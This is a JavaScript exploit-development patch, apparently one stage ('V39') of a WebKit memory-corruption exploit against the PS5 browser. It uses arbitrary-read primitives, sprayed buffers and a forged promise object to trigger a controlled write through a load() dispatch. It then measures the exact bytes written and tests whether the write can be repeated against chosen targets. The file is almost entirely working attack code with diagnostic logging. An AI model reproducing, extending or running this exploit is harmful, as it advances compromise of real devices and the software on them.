// V39 Patch: FULL WRITE FOOTPRINT + MULTI-SHOT TEST
//
// CONTEXT: V38 proved the COOP write is real: reject(Exception{NetworkError})
// writes into our forged promise at the aimed address. But V38 used an
// all-zeros promise, so only bytes that went from 0 to non-zero were visible
// (0xF at +0x08, 0x1 at +0x20). The HIDDEN writes (Exception.m_message null
// String at +0x10, Expected.has_value at +0x18, and any padding) were
// invisible because 0→0 doesn't diff.
//
// SOURCE ANALYSIS (StructureID.h, Exception.h, ExceptionOr.h, DOMPromiseProxy.h):
//   Exception { ExceptionCode m_code (uint32); String m_message (8B RefPtr) }
//   ExceptionOr<void> = Expected<void, Exception>: { Exception storage (16B), has_value (bool) }
//   std::optional<ExceptionOr<void>>: { ExceptionOr (24B), engaged (bool) }
//
//   reject() assigns: m_valueOrException = ExceptionOr<void>{WTFMove(Exception{NetworkError})}
//   This WRITES:
//     +0x08: m_code = 0xF (uint32, 4 bytes)
//     +0x0C: ??? (padding after m_code — may or may not be written)
//     +0x10: m_message = null String (uint64, 8 bytes — ZEROES whatever was there)
//     +0x18: has_value = false (1 byte)
//     +0x19..+0x1F: ??? (padding — may or may not be written)
//     +0x20: engaged = true (1 byte)
//
// PHASE A: SENTINEL TEST
//   Fill forged promise +0x00..+0x27 with 0x42 (EXCEPT +0x20 = 0 for isFulfilled).
//   Keep +0x28..+0x3F zeroed (deferred Vector must be empty/safe).
//   Fire the COOP write. BYTE-LEVEL diff reveals the exact write mask.
//
// PHASE B: MULTI-SHOT TEST
//   After Phase A: re-zero the forge, re-craft the face (re-borrow timer,
//   reset status to Pending), fire again. If it returns, the COOP write is
//   REPEATABLE — we can aim successive writes at different targets.
//
// CRITICAL SOURCE FINDING (also logged):
//   StructureID on PS5 is OFFSET-BASED (StructureID.h line 50-51):
//     PLATFORM(PLAYSTATION) → structureHeapAddressSize = 128MB
//     decode() = (bits & 0x7FFFFFF) + startOfStructureHeap()
//   Writing structureID = 0xF → decodes to startOfStructureHeap + 0xE
//   → inside MarkedBlock header (< blockSize 16KB) → NOT a valid Structure.
//   THE STRUCTUREID CONFUSION PATH IS DEAD ON PS5.

/* ==== V39: WRITE FOOTPRINT + MULTI-SHOT ==== */

try{
  if(MBUF>0n&&VP>0n&&bufs&&bufs.length>0&&fbRaw&&fbRaw.length>=128&&l2raw&&fbRaw.length>=128){
    var FSG=BASE+0x5B3D6B0n, NOPG=BASE+0x4001750n;
    var mIdx=-1;
    var tH=readAt(MBUF+0x48n,8); var tV=qAt(tH,0);
    if((tV>>32n)===0xAAn)mIdx=Number(tV&0xFFFFFFFFn);
    bs('V39-TAG-mIdx='+mIdx);

    if(mIdx>=0&&mIdx<32){
      var sv=new DataView(window.__v688.spray[mIdx]);
      var S=MBUF;
      var hitBuf=bufs[0][0];

      /* ============================================================
       *  PHASE A: SENTINEL WRITE FOOTPRINT
       * ============================================================ */
      bs('V39-PHASE-A-sentinel');

      /* ---- STEP 1: ALL readAt FIRST ---- */
      var promiseAddr=qAt(readAt(FB+0x18n,8),0);
      bs('V39-REAL-PROMISE-ADDR='+hex(promiseAddr));

      var headH=readAt(FB-0x20n,0x48);
      bs('V39-HEAD='+headH);

      bs('V39-SIBLING-SCAN');
      var sib=0n, sibBk=0n;
      for(var sa=FB-0x2000n;sa<FB+0x2000n&&sib===0n;sa+=8n){
        var q0h=readAt(sa,8);
        if(qAt(q0h,0)===VP){
          var bkH=readAt(sa+0x10n,8);
          var bk=qAt(bkH,0);
          if(bk>0x1000000000n&&bk!==S&&bk!==FB&&bk!==self&&bk<0x10000000000n){sib=sa;sibBk=bk;}
        }
      }
      if(sibBk===0n){bs('V39-NO-SIBLING');verd('err','V39 no sibling');throw 'no sibling';}
      bs('V39-SIBLING='+hex(sib)+'-backing='+hex(sibBk));

      var timerH=readAt(sibBk+0x88n,0x38);
      bs('V39-TIMER-BORROWED='+timerH);

      /* ---- STEP 2: build the FORGE ---- */
      bs('V39-FORGE-BUILD');

      /* impl: L2 byte-copy, m_ptr = C' = S+0x70 */
      for(var ib=0;ib<0x20;ib++)sv.setUint8(ib,parseInt(l2raw.substr(ib*2,2),16));
      dvSetBig(sv,0x08,S+0x70n);
      bs('V39-IMPL-rc='+sv.getUint32(0x00,true)+'-m_ptr='+hex(dvGetBig(sv,0x08)));

      /* metadata + buckets (the proven 4-bucket ladder) */
      sv.setUint32(0x20,0,true); sv.setUint32(0x24,1,true);
      sv.setUint32(0x28,3,true); sv.setUint32(0x2C,4,true);
      dvSetBig(sv,0x30,S); dvSetBig(sv,0x38,0n); dvSetBig(sv,0x40,0n); dvSetBig(sv,0x48,0n);

      /* THE HEAD COPY: 0x48 bytes from [FB-0x20) -> S+0x50..0x98 */
      for(var hc=0;hc<0x48;hc++)sv.setUint8(0x50+hc,parseInt(headH.substr(hc*2,2),16));
      var headN=sv.getUint32(0x68,true);
      var headVptr=dvGetBig(sv,0x70);
      bs('V39-HEAD-rcN='+headN+'-vptr='+hex(headVptr));

      /* aim promise at S+0xC0 */
      var realPromiseCopied=dvGetBig(sv,0x88);
      bs('V39-PROMISE-ORIG='+hex(realPromiseCopied)+'-aiming='+hex(S+0xC0n));
      dvSetBig(sv,0x88,S+0xC0n);

      /* **** THE V39 SENTINEL FILL ****
       * Fill promise+0x00..+0x1F with 0x42 (sentinel).
       * promise+0x20 MUST be 0x00 (the engaged flag — isFulfilled reads it).
       * promise+0x21..+0x27 filled with 0x42 (padding after engaged).
       * promise+0x28..+0x3F zeroed (deferred Vector — must be empty). */
      for(var pf=0xC0;pf<0xE0;pf++)sv.setUint8(pf,0x42);   /* +0x00..+0x1F: sentinel */
      sv.setUint8(0xE0,0x00);                                 /* +0x20: engaged=false (CRITICAL) */
      for(var pp=0xE1;pp<0xE8;pp++)sv.setUint8(pp,0x42);     /* +0x21..+0x27: sentinel */
      for(var pz=0xE8;pz<0x100;pz++)sv.setUint8(pz,0);       /* +0x28..+0x3F: zeroed Vector */

      bs('V39-SENTINEL-FILL-done-0x42-at-C0-DF+E1-E7-zero-at-E0+E8-FF');

      bs('V39-FORGE-BUILT');

      /* snapshot BEFORE the dispatch (byte-level) */
      var preA=new Uint8Array(window.__v688.spray[mIdx].slice(0xC0,0x100));

      /* ---- STEP 3: craft the FACE ---- */
      bs('V39-FACE-CRAFT');
      for(var sz=0x28;sz<=0x57;sz++)hitBuf[sz]=0;
      for(var c2=0x60;c2<=0x67;c2++)hitBuf[c2]=0;
      hitBuf[0x82]=0; hitBuf[0x83]=1; hitBuf[0x87]=1;
      for(var bl=0x84;bl<=0x89;bl++)hitBuf[bl]=1;
      for(var tb=0;tb<0x38;tb++)hitBuf[0x88+tb]=parseInt(timerH.substr(tb*2,2),16);
      for(var hz=0x98;hz<0xA8;hz++)hitBuf[hz]=0;
      for(var hz2=0xA8;hz2<0xB0;hz2++)hitBuf[hz2]=0;

      /* ---- STEP 4: install ---- */
      for(var hb=0;hb<8;hb++)hitBuf[0x58+hb]=Number(((S+0x30n)>>BigInt(hb*8))&0xFFn);

      /* ---- STEP 5: GATES ---- */
      var gatesOK=true;

      /* G1 metadata */
      var g1hex='';for(var g1=0;g1<16;g1++)g1hex+=('0'+sv.getUint8(0x20+g1).toString(16)).slice(-2);
      if(g1hex!=='00000000010000000300000004000000'){gatesOK=false;bs('V39-G1-FAIL');}
      else bs('V39-G1-meta-OK');

      /* G2 install */
      var g2=0n;for(var g2b=0;g2b<8;g2b++)g2|=BigInt(hitBuf[0x58+g2b])<<BigInt(g2b*8);
      if(g2!==(S+0x30n)){gatesOK=false;bs('V39-G2-FAIL');}else bs('V39-G2-install-OK');

      /* G3/G4 counters+sources */
      var g3ok=true,g4ok=true;
      for(var g3=0x60;g3<0x68;g3++)if(hitBuf[g3]!==0)g3ok=false;
      for(var g4=0x48;g4<0x58;g4++)if(hitBuf[g4]!==0)g4ok=false;
      if(!g3ok||!g4ok){gatesOK=false;bs('V39-G3G4-FAIL');}else bs('V39-G3G4-zero-OK');

      /* G5 status/timer */
      var g5v=0n;for(var q9=0;q9<8;q9++)g5v|=BigInt(hitBuf[0x90+q9])<<BigInt(q9*8);
      var g5t=0n;for(var q10=0;q10<8;q10++)g5t|=BigInt(hitBuf[0xB0+q10])<<BigInt(q10*8);
      if(!(hitBuf[0x82]===0&&hitBuf[0x87]===1&&g5v!==0n&&g5t!==0n)){gatesOK=false;bs('V39-G5-FAIL');}
      else bs('V39-G5-timer-OK');

      /* GH: the head gates */
      if(!(headN>=1)){gatesOK=false;bs('V39-GH-FAIL-rcN='+headN);}
      else bs('V39-GH-rcN='+headN+'-OK');
      var currentVptr=dvGetBig(sv,0x70);
      if(currentVptr!==VP){gatesOK=false;bs('V39-GH-FAIL-vptr='+hex(currentVptr));}
      else bs('V39-GH-vptr=REAL-VP-OK');

      /* GI: impl.m_ptr */
      if(dvGetBig(sv,0x08)!==(S+0x70n)){gatesOK=false;bs('V39-GI-FAIL');}
      else bs('V39-GI-impl-mptr-OK');

      /* GP: promise aimed + sentinel check */
      var gPromise=dvGetBig(sv,0x88);
      if(gPromise!==(S+0xC0n)){gatesOK=false;bs('V39-GP-FAIL-promise='+hex(gPromise));}
      else bs('V39-GP-promise-aimed-OK');
      /* verify sentinel at +0x08 and engaged=0 at +0x20 */
      if(sv.getUint8(0xC8)!==0x42){gatesOK=false;bs('V39-GP-FAIL-sentinel-C8');}
      if(sv.getUint8(0xE0)!==0x00){gatesOK=false;bs('V39-GP-FAIL-engaged-not-zero');}
      if(gatesOK)bs('V39-GP-sentinel-OK');

      if(!gatesOK){
        bs('V39-GATE-FAIL-ABORT-NO-LOAD');
        verd('err','V39 gate fail');
      }else{
        bs('V39-GATES-ALL-OK');

        /* ---- STEP 6: THE DISPATCH (Phase A) ---- */
        bs('V39-A-LOAD-PRE');
        var loadReturned=false;
        try{
          faces[zi].load();
          loadReturned=true;
          bs('V39-A-LOAD-RETURNED');
        }catch(e){
          bs('V39-A-LOAD-THREW-'+String(e&&e.message?e.message:'?'));
        }

        /* ---- STEP 7: BYTE-LEVEL DIFF (the full write mask) ---- */
        bs('V39-A-WIT-status='+hitBuf[0x82]+'-opcount='+(hitBuf[0x60]|(hitBuf[0x61]<<8))+'-rc-after='+sv.getUint32(0x68,true)+'-rc-before='+headN);

        var curA=new Uint8Array(window.__v688.spray[mIdx].slice(0xC0,0x100));
        var byteDiffs=[];
        for(var bd=0;bd<0x28;bd++){
          if(curA[bd]!==preA[bd]){
            byteDiffs.push('+'+bd.toString(16).padStart(2,'0')+':'+preA[bd].toString(16).padStart(2,'0')+'>'+curA[bd].toString(16).padStart(2,'0'));
          }
        }

        if(byteDiffs.length){
          bs('V39-WRITE-MASK='+byteDiffs.join('|'));

          /* Classify each offset range */
          var codeWritten=false, padWritten=false, strWritten=false, hvWritten=false, hvPadWritten=false, engWritten=false;
          for(var cd=0x08;cd<0x0C;cd++)if(curA[cd]!==preA[cd])codeWritten=true;
          for(var pd=0x0C;pd<0x10;pd++)if(curA[pd]!==preA[pd])padWritten=true;
          for(var sd=0x10;sd<0x18;sd++)if(curA[sd]!==preA[sd])strWritten=true;
          if(curA[0x18]!==preA[0x18])hvWritten=true;
          for(var hp=0x19;hp<0x20;hp++)if(curA[hp]!==preA[hp])hvPadWritten=true;
          if(curA[0x20]!==preA[0x20])engWritten=true;

          bs('V39-CLASS-code='+codeWritten+'-pad0C='+padWritten+'-string10='+strWritten+'-hasval18='+hvWritten+'-hvpad='+hvPadWritten+'-engaged20='+engWritten);

          /* The key question: is +0x10 zeroed? */
          var strVal=0n;
          for(var sv10=0;sv10<8;sv10++)strVal|=BigInt(curA[0x10+sv10])<<BigInt(sv10*8);
          bs('V39-STRING-FIELD-AT-10='+hex(strVal)+(strVal===0n?'-ZEROED-CONFIRMED':'-NONZERO'));

          if(loadReturned){
            bs('V39-A-COOP-WRITE-CONFIRMED');
            verd('ok','V39-A footprint measured');
          }
        }else{
          bs('V39-A-NO-DIFFS-in-promise-region');
          if(!loadReturned)bs('V39-A-crashed-no-diffs');
        }

        /* Also dump the raw post-state of the promise region for full visibility */
        var postHex='';
        for(var ph=0;ph<0x28;ph++)postHex+=curA[ph].toString(16).padStart(2,'0');
        bs('V39-A-POST-RAW='+postHex);

        /* ============================================================
         *  PHASE B: MULTI-SHOT TEST
         *  Can we fire the COOP write AGAIN on the same face?
         *  Re-zero promise, re-craft face, fire load() a second time.
         * ============================================================ */
        if(loadReturned){
          bs('V39-PHASE-B-multishot');

          /* B1: re-borrow timer (readAt still works — the walk chain is
           * independent of face status; we just need to un-install+re-install
           * the table pointer around the reads) */

          /* Temporarily restore original table pointer for readAt */
          for(var rb=0;rb<8;rb++)hitBuf[0x58+rb]=Number((L1>>BigInt(rb*8))&0xFFn);

          var timerH2=readAt(sibBk+0x88n,0x38);
          bs('V39-B-TIMER-REBORROWED='+timerH2);

          /* B2: re-zero the forged promise (fresh unfulfilled state) */
          for(var rz=0xC0;rz<0x100;rz++)sv.setUint8(rz,0);
          bs('V39-B-PROMISE-REZEROED');

          /* B3: re-aim promise (should already be S+0xC0 but be explicit) */
          dvSetBig(sv,0x88,S+0xC0n);

          /* B4: re-craft the face */
          bs('V39-B-FACE-RECRAFT');
          for(var sz2=0x28;sz2<=0x57;sz2++)hitBuf[sz2]=0;
          for(var c22=0x60;c22<=0x67;c22++)hitBuf[c22]=0;
          hitBuf[0x82]=0; hitBuf[0x83]=1; hitBuf[0x87]=1;
          for(var bl2=0x84;bl2<=0x89;bl2++)hitBuf[bl2]=1;
          for(var tb2=0;tb2<0x38;tb2++)hitBuf[0x88+tb2]=parseInt(timerH2.substr(tb2*2,2),16);
          for(var hz3=0x98;hz3<0xA8;hz3++)hitBuf[hz3]=0;
          for(var hz4=0xA8;hz4<0xB0;hz4++)hitBuf[hz4]=0;

          /* B5: re-install table pointer (LAST write before load) */
          for(var hb2=0;hb2<8;hb2++)hitBuf[0x58+hb2]=Number(((S+0x30n)>>BigInt(hb2*8))&0xFFn);

          /* B6: gates for shot 2 */
          var g2ok=true;
          var g2_1='';for(var g2_1i=0;g2_1i<16;g2_1i++)g2_1+=('0'+sv.getUint8(0x20+g2_1i).toString(16)).slice(-2);
          if(g2_1!=='00000000010000000300000004000000'){g2ok=false;bs('V39-B-G1-FAIL');}
          if(hitBuf[0x82]!==0){g2ok=false;bs('V39-B-G5-status-FAIL='+hitBuf[0x82]);}
          var g2_5v=0n;for(var g2q=0;g2q<8;g2q++)g2_5v|=BigInt(hitBuf[0x90+g2q])<<BigInt(g2q*8);
          if(g2_5v===0n){g2ok=false;bs('V39-B-G5-timer-FAIL');}
          if(sv.getUint8(0xE0)!==0x00){g2ok=false;bs('V39-B-GP-engaged-FAIL');}
          if(g2ok)bs('V39-B-GATES-OK');

          if(!g2ok){
            bs('V39-B-GATE-FAIL-NO-SECOND-SHOT');
          }else{
            /* B7: snapshot before shot 2 */
            var preB=new Uint8Array(window.__v688.spray[mIdx].slice(0xC0,0x100));

            /* B8: FIRE SHOT 2 */
            bs('V39-B-LOAD-PRE');
            var load2=false;
            try{
              faces[zi].load();
              load2=true;
              bs('V39-B-LOAD-RETURNED');
            }catch(e2){
              bs('V39-B-LOAD-THREW-'+String(e2&&e2.message?e2.message:'?'));
            }

            /* B9: witness shot 2 */
            bs('V39-B-WIT-status='+hitBuf[0x82]+'-rc-after='+sv.getUint32(0x68,true));

            var curB=new Uint8Array(window.__v688.spray[mIdx].slice(0xC0,0x100));
            var diffs2=[];
            for(var bd2=0;bd2<0x28;bd2++){
              if(curB[bd2]!==preB[bd2])diffs2.push('+'+bd2.toString(16).padStart(2,'0')+':'+preB[bd2].toString(16).padStart(2,'0')+'>'+curB[bd2].toString(16).padStart(2,'0'));
            }
            if(diffs2.length){
              bs('V39-B-WRITE-MASK='+diffs2.join('|'));
              if(load2){
                bs('V39-MULTISHOT-CONFIRMED-two-clean-dispatches');
                verd('ok','V39 MULTISHOT CONFIRMED');
              }
            }else{
              bs('V39-B-NO-DIFFS'+(load2?'-returned-but-no-write':'-crashed'));
            }
          }
        }

        /* ---- CLEANUP: restore original table pointer ---- */
        for(var rc=0;rc<8;rc++)hitBuf[0x58+rc]=Number((L1>>BigInt(rc*8))&0xFFn);
        bs('V39-RESTORED');
        bs('V39-DONE');
      }

    }else bs('V39-SKIP-bad-idx');
  }else bs('V39-SKIP-missing-data');
}catch(e39){bs('V39-ERR-'+String(e39&&e39.message?e39.message:'?'));}
/* ==== V39 END ==== */
